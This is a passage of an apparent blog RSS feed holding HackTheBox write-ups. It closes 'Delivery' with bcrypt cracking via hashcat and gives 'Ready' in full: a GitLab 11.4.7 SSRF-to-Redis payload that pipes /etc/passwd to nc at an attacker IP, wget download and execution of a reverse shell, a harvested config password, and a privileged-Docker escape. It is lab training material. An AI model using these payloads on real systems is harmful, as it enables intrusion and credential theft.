+| Username                         | password                                                     |
++----------------------------------+--------------------------------------------------------------+
+| surveybot                        |                                                              |
+| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
+| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
+| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
+| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
+| channelexport                    |                                                              |
+| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
+| a9647633                         | $2a$10$NPohGjjgCpRgA6fyFTnKhO5Y4l5XZchc7ax5mcOplVPU/qN/KjQri |
++----------------------------------+--------------------------------------------------------------+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;On the internal Mattermost channel, it was mentioned that &amp;ldquo;PleasSubcribe!&amp;rdquo; was probably used a lot and though it wasn&amp;rsquo;t in rockyou.txt the admin thought it could be cracked pretty trivially with some rules.&lt;/p&gt;
+&lt;p&gt;Before it can be cracked, the hash type needs to be identified.  Hash identifier can typically get you on the right track with these and this one is predicted to be bcrypt.&lt;/p&gt;
+&lt;p&gt;Rules are a way to create variations of Passwords without needing a larger password file. They can be things like adding &lt;code&gt;1234&lt;/code&gt; at the end of a password or exchanging &amp;ldquo;a&amp;rdquo; for &amp;ldquo;@&amp;rdquo;. Hashcat includes a number of rules configuration files and they can be a good starting point. Next a &amp;ldquo;wordlist&amp;rdquo; with the single the single password, &amp;ldquo;PleaseSubscribe!&amp;rdquo; is created.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-PowerShell&#34; data-lang=&#34;PowerShell&#34;&gt;.\hashcat64.exe -a 0 -m 3200 .\hashes_in.txt .\wordlist.txt -r .\rules\base64.rule
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-hashcatcracked.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;A result comes back pretty quickly.&lt;code&gt;root:PleaseSubscribe!21&lt;/code&gt; That can be used to login over SSH and gain full access over the machine.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-root.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;h2 id=&#34;notetxt&#34;&gt;note.txt&lt;/h2&gt;
+&lt;p&gt;IppSec left a note.txt providing some more context and inspiration behind the foothold on this box. I highly recommend giving it a read.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@Delivery:~# cat note.txt
+I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I&#39;ve seen several times.  The inspiration for the box is here:
+
+- https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c
+
+Keep on hacking! And please don&#39;t forget to subscribe to all the security streamers out there.
+
+- ippsec
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the spirit of the note, here are some cybersecurity streamers and YouTubers I would recommend checking out.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;IppSec&lt;/a&gt;
+, the creator or this box, releases a video writeups for HTB boxes are they retire. They are very well put together and I would highly recommend checking them out for HTB or using &lt;a href=&#34;https://ippsec.rocks/&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;his site&lt;/a&gt;
+ to lookup specific tools or situations you might encounter.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/channel/UCVeW9qkBjo3zosnqUbG7CFw&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;John Hammond&lt;/a&gt;
+ posts video writeups for various CTFs and wargames. Awesome friendly guy and I totally recommend checking him out especially if you are looking to get started as a beginner.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;LiveOverflow&lt;/a&gt;
+ makes videos on various CTF challenges and also dug into several other topics in some short series including, hardware security research, browser exploitation, Pwn Adventure 3 (a game designed for hacking) and a whole lot more.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/channel/UC3S8vxwRfqLBdIhgRlDRVzw&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;StackSmashing&lt;/a&gt;
+ has done some really cool things in relation to hardware, reverse engineering, and hacking handheld game devices. There is also a few on reversing WannaCry and one about reversing and modifying an IoT Camera.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/channel/UCCkVMojdBWS-JtH7TliWkVg&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Gynvael&lt;/a&gt;
+ streams regularly each week on various cyber security topics. One things about it is because it is a live stream, you get a chance to see raw work flow and methodology.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.twitch.tv/gamozo&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Gamozo Labs&lt;/a&gt;
+ does a lot of low level programming. His tool of choice is Rust and he has a lot of cool projects to show from writing an OS to a kernel exploit for an older version of Android. I won&amp;rsquo;t claim to understand everything he is doing but it&amp;rsquo;s very fun to hang around and I still manage to pick up bits and pieces. He posts many of his past streams on &lt;a href=&#34;https://www.youtube.com/channel/UC17ewSS9f2EnkCyMztCdoKA&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;YouTube&lt;/a&gt;
+.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/channel/UCW6MNdOsqv2E9AjQkv9we7A&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;PwnFunction&lt;/a&gt;
+ has some really awesome dives explaining various web vulnerabilities, what causes them and how to exploit them. Recently he has also been working on a Binary Exploitation series.&lt;/p&gt;
+&lt;p&gt;If you are looking for &lt;em&gt;even more&lt;/em&gt; cybersecurity content creators, check out this video -&amp;gt; &lt;a href=&#34;https://www.youtube.com/watch?v=GSraDuD4ziQ&#34;&gt;https://www.youtube.com/watch?v=GSraDuD4ziQ&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;wrap-up&#34;&gt;Wrap up&lt;/h2&gt;
+&lt;p&gt;This box is probably one of my favorites simply because the foothold was so satisfying once I figured out and yet incredibly simple. I really appreciate IppSec taking the time to make this box and include the note about the inspiration. Hopefully, it was insightful for the rest of you as well.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>HTB Ready</title>
+      <link>http://nightwolf56.github.io/htb-writeups/ready-writeup.md/</link>
+      <pubDate>Sat, 15 May 2021 00:00:00 -0600</pubDate>
+      
+      <guid>http://nightwolf56.github.io/htb-writeups/ready-writeup.md/</guid>
+      <description>&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ready-logo.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;Ready is a GitLab instance were we exploit an SSRF in order to get code execution and find ourselves in a docker container. We find some credentials to escalate to root inside the container and then leverage the fact it was started with the &amp;ldquo;privileged&amp;rdquo; flag to escape the container.&lt;/p&gt;
+&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting Nmap 7.91 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2021-01-27 00:15 UTC
+Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.129.90.66
+Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.095s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;998&lt;/span&gt; closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| ssh-hostkey:
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;3072&lt;/span&gt; 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+5080/tcp open  http    nginx
+| http-robots.txt: &lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt; disallowed entries &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; shown&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| / /autocomplete/users /search /api /admin /profile
+| /dashboard /projects/new /groups/new /groups/*/edit /users /help
+|_/s/ /snippets/new /snippets/*/edit
+| http-title: Sign in &lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;C2&lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;B7 GitLab
+|_Requested resource was http://10.129.90.66:5080/users/sign_in
+|_http-trane-info: Problem with XML parsing of /evox/about
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 20.31 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;NMAP shows that port 22 is open for SSH and there is a GitLab instance running a web server on port 5080. A sign in page is accessible that allows new accounts to be created.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ready-gitlabsignup.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;With a newly created account it is possible to check for any public projects or users to find more information in this box. However, in this instance there isn&amp;rsquo;t anything and the instance appears blank.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ready-gitlabhelppage.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;It is possible to access a help page which, among other things, lists the current version, 11.4.7 and the notice to &amp;ldquo;Update asap&amp;rdquo;.&lt;/p&gt;
+&lt;p&gt;Research on GitLab 11.4.7 there is a well know RCE through an Server Side Request Forgery, a type of vulnerability, where an an attacker can change a URL which the server will attempt to read or submit data too. In this case, it allows us to interact with an internal redis database service and start a malicious worker package.  This vulnerability was was featured in Real World CTF 2018 and LiveOverflow created a &lt;a href=&#34;https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;video and blog post&lt;/a&gt;
+ detailing it.&lt;/p&gt;
+&lt;p&gt;It is possible to follow along with the blog post to create a proof of concept allowing  &lt;code&gt;/etc/passwd&lt;/code&gt; to be read.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; multi
+ sadd resque:gitlab:queues system_hook_push
+ lpush resque:gitlab:queue:system_hook_push &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{\&amp;#34;class\&amp;#34;:\&amp;#34;GitlabShellWorker\&amp;#34;,\&amp;#34;args\&amp;#34;:[\&amp;#34;class_eval\&amp;#34;,\&amp;#34;open(\&amp;#39;|cat /etc/passwd | nc 10.10.14.142 1234\&amp;#39;).read\&amp;#34;],\&amp;#34;retry\&amp;#34;:3,\&amp;#34;queue\&amp;#34;:\&amp;#34;system_hook_push\&amp;#34;,\&amp;#34;jid\&amp;#34;:\&amp;#34;ad52abc5641173e217eb2e52\&amp;#34;,\&amp;#34;created_at\&amp;#34;:1513714403.8122594,\&amp;#34;enqueued_at\&amp;#34;:1513714403.8129568}&amp;#34;&lt;/span&gt;
+ exec
+ exec
+/ssrf.git
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This payload is URL encoded and then &lt;code&gt;git://[0:0:0:0:0:ffff:127.0.0.1]:6379/&lt;/code&gt; is added to the front to bypass the check filter to block requests to localhost on the GitLab server. The next step is to create a new project and chose to import a git repo by URL.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ready-importproject.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;Provide our URL encoded payload, set up a netcat listener on port 1234, and then submitting the payload, returns the contents of &lt;code&gt;/etc/password&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;git://&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0:0:0:0:0:ffff:127.0.0.1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;:6379/%0A%20multi%0A%20sadd%20resque:gitlab:queues%20system_hook_push%0A%20lpush%20resque:gitlab:queue:system_hook_push%20%22%7B%5C%22class%5C%22:%5C%22GitlabShellWorker%5C%22,%5C%22args%5C%22:%5B%5C%22class_eval%5C%22,%5C%22open&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%5C&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%7Ccat%20/etc/passwd%20%7C%20nc%2010.10.14.142%201234%5C&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.read%5C%22%5D,%5C%22retry%5C%22:3,%5C%22queue%5C%22:%5C%22system_hook_push%5C%22,%5C%22jid%5C%22:%5C%22ad52abc5641173e217eb2e52%5C%22,%5C%22created_at%5C%22:1513714403.8122594,%5C%22enqueued_at%5C%22:1513714403.8129568%7D%22%0A%20exec%0A%20exec%0A/ssrf.git
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ready-etcpasswdfromimport.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+&lt;p&gt;Obtaining a reverse shell proved to be a bit tricky. Executing one reverse shell directly from called back but then terminated immediately. Instead, a shell can be obtained in few additional steps. Create a bash reverse shell in a script and start a python http server. Then use two SSRF requests. The first one downloads the revershell using wget. The second one executes it.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Get script.sh&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; multi
+ sadd resque:gitlab:queues system_hook_push
+ lpush resque:gitlab:queue:system_hook_push &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{\&amp;#34;class\&amp;#34;:\&amp;#34;GitlabShellWorker\&amp;#34;,\&amp;#34;args\&amp;#34;:[\&amp;#34;class_eval\&amp;#34;,\&amp;#34;open(\&amp;#39;| wget http://10.10.14.142/script.sh \&amp;#39;).read\&amp;#34;],\&amp;#34;retry\&amp;#34;:3,\&amp;#34;queue\&amp;#34;:\&amp;#34;system_hook_push\&amp;#34;,\&amp;#34;jid\&amp;#34;:\&amp;#34;ad52abc5641173e217eb2e52\&amp;#34;,\&amp;#34;created_at\&amp;#34;:1513714403.8122594,\&amp;#34;enqueued_at\&amp;#34;:1513714403.8129568}&amp;#34;&lt;/span&gt;
+ exec
+ exec
+/ssrf.git
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Execute script.sh&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; multi
+ sadd resque:gitlab:queues system_hook_push
+ lpush resque:gitlab:queue:system_hook_push &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{\&amp;#34;class\&amp;#34;:\&amp;#34;GitlabShellWorker\&amp;#34;,\&amp;#34;args\&amp;#34;:[\&amp;#34;class_eval\&amp;#34;,\&amp;#34;open(\&amp;#39;| bash script.sh \&amp;#39;).read\&amp;#34;],\&amp;#34;retry\&amp;#34;:3,\&amp;#34;queue\&amp;#34;:\&amp;#34;system_hook_push\&amp;#34;,\&amp;#34;jid\&amp;#34;:\&amp;#34;ad52abc5641173e217eb2e52\&amp;#34;,\&amp;#34;created_at\&amp;#34;:1513714403.8122594,\&amp;#34;enqueued_at\&amp;#34;:1513714403.8129568}&amp;#34;&lt;/span&gt;
+ exec
+ exec
+/ssrf.git
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ready-shellhuzzah.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;h2 id=&#34;user&#34;&gt;User&lt;/h2&gt;
+&lt;p&gt;Very first thing to do, especially since this was a pain, is to upgrade are shell so we have more options and are less likely to crash it.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;git@gitlab:~/gitlab-rails/working$ python3 -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;&lt;/span&gt;
+&amp;lt;orking$ python3 -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;&lt;/span&gt;
+git@gitlab:~/gitlab-rails/working$ ^Z
+zsh: suspended  nc -lnvp &lt;span style=&#34;color:#ae81ff&#34;&gt;1234&lt;/span&gt;
+
+┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;nightwolf㉿archlinux&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/HTB/Ready&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─$ stty -a | head -n1 | cut -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;;&amp;#39;&lt;/span&gt; -f 2-3 | cut -b2- | sed &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s/; /\n/&amp;#39;&lt;/span&gt;                                                                                          &lt;span style=&#34;color:#ae81ff&#34;&gt;148&lt;/span&gt; ⨯ &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; ⚙
+rows &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt;
+columns &lt;span style=&#34;color:#ae81ff&#34;&gt;170&lt;/span&gt;
+
+┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;nightwolf㉿archlinux&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/HTB/Ready&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─$ stty raw -echo; fg                                                                                                                                                &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; ⚙
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;  + continued  nc -lnvp &lt;span style=&#34;color:#ae81ff&#34;&gt;1234&lt;/span&gt;
+                               stty rows &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt; cols &lt;span style=&#34;color:#ae81ff&#34;&gt;170&lt;/span&gt;
+git@gitlab:~/gitlab-rails/working$ export TERM&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;xterm-256color
+git@gitlab:~/gitlab-rails/working$ exec /bin/bash
+git@gitlab:~/gitlab-rails/working$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The user can be found in &lt;code&gt;/home/dude/user.txt&lt;/code&gt; but the current user of &lt;code&gt;gitlab&lt;/code&gt; is unable to read the file itself. &lt;code&gt;gitlab&lt;/code&gt; doesn&amp;rsquo;t have any interesting groups or files that stand out in it&amp;rsquo;s  home folder. There don&amp;rsquo;t have any passwords to try with suds or su. Expanding the search, for config files that might contain credentials or other interesting info,  &lt;code&gt;.dockerenv&lt;/code&gt; is found. This  is a file in the root of the file system, letting us know that the current shell is inside a docker container.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ready-inthematrix.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;In the the &lt;code&gt;/opt&lt;/code&gt; directory there is a folder titled &amp;ldquo;backup&amp;rdquo; inside are various configuration files for GitLab and a docker compose file that looks to have been the same one that may have been used to start this container.&lt;/p&gt;
+&lt;p&gt;Another file present in the same folder is &lt;code&gt;gitlab.rb&lt;/code&gt; a configuration file for GItLab. There is a lot of data to sift through inside it. Grep can be used to to filter out some more useful info. For example the following can be used to find references to &amp;ldquo;password &amp;ldquo;&lt;code&gt;grep -R &amp;quot;password&amp;quot; ./&lt;/code&gt;  and reveals, &lt;code&gt;wW59U!ZKMbG9+*#h&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ready-backupdirpassword.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;This password is not valid for &lt;code&gt;dude&lt;/code&gt; but does allow  &lt;code&gt;su&lt;/code&gt; to &lt;code&gt;root&lt;/code&gt; user inside the container. User.txt is also accessible.&lt;/p&gt;
+&lt;h2 id=&#34;root&#34;&gt;Root&lt;/h2&gt;
+&lt;p&gt;Docker is a platform that makes use of Linux namespaces to provide an isolated environment called a container. They can seem similar to virtual machines but are different on a technical level. If you want to read some more about that you can check out the &lt;a href=&#34;https://docs.docker.com/get-started/overview/#the-underlying-technology&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;documentation&lt;/a&gt;
+&lt;/p&gt;
+&lt;p&gt;The docker compose file found before showed the container was likely started with the &lt;code&gt;--privileged&lt;/code&gt; flag, not something. The &lt;code&gt;--privileged&lt;/code&gt; flag launches the container with extended privileges that can be abused.&lt;/p&gt;
+&lt;p&gt;From the documentation, &amp;ldquo;By default, Docker containers are “unprivileged” and cannot, for example, run a Docker daemon inside a Docker container. This is because by default a container is not allowed to access any devices, but a “privileged” container is given access to all devices (see the documentation on &lt;a href=&#34;https://www.kernel.org/doc/Documentation/cgroup-v1/devices.txt&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;cgroups devices&lt;/a&gt;
+).&lt;/p&gt;
+&lt;p&gt;When the operator executes &lt;code&gt;docker run --privileged&lt;/code&gt;, Docker will enable access to all devices on the host as well as set some configuration in AppArmor or SELinux to allow the container nearly all the same access to the host as processes running outside containers on the host. Additional information about running with &lt;code&gt;--privileged&lt;/code&gt; is available on the &lt;a href=&#34;http://blog.docker.com/2013/09/docker-can-now-run-within-docker/&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Docker Blog&lt;/a&gt;
+.&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;This is going to enable escape from the container and gain root on the host in two very simple commands. First make a directory and then simply mount sda2 in that directory.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;mkdir -p /mnt/hola
+mount /dev/sda2 /mnt/hola
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the the file system from of the host system is accessible the container.  &lt;code&gt;/mnt/hola/root&lt;/code&gt; contains the root flag.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ready-mountoutsidefilesystem.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;It is possible to obtain a root shell on the host system itself through several methods. One of which is retrive the root ssh key from, &lt;code&gt;/mnt/hola/root/.ssh/id_rsa&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ready-caniintrestyouinashell.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ready-indeedyoucan.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;h2 id=&#34;wrap-up&#34;&gt;Wrap up&lt;/h2&gt;
+&lt;p&gt;Huge thanks to &lt;a href=&#34;https://app.hackthebox.eu/users/27897&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;bertolis&lt;/a&gt;
+ for creating this machine.  I did see several comments talking about how it was very similar to another machine that was active at the time but it still felt unique to me, especially after foothold. A docker escape was also pretty fun and I&amp;rsquo;d like to learn more advanced ways to do that in the future.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>HTB Ready</title>
+      <link>http://nightwolf56.github.io/posts/ready-writeup.md/</link>
+      <pubDate>Sat, 15 May 2021 00:00:00 -0600</pubDate>
+      
+      <guid>http://nightwolf56.github.io/posts/ready-writeup.md/</guid>
+      <description>&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ready-logo.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;Ready is a GitLab instance were we exploit an SSRF in order to get code execution and find ourselves in a docker container. We find some credentials to escalate to root inside the container and then leverage the fact it was started with the &amp;ldquo;privileged&amp;rdquo; flag to escape the container.&lt;/p&gt;
+&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting Nmap 7.91 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2021-01-27 00:15 UTC
+Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.129.90.66
+Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.095s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;998&lt;/span&gt; closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| ssh-hostkey:
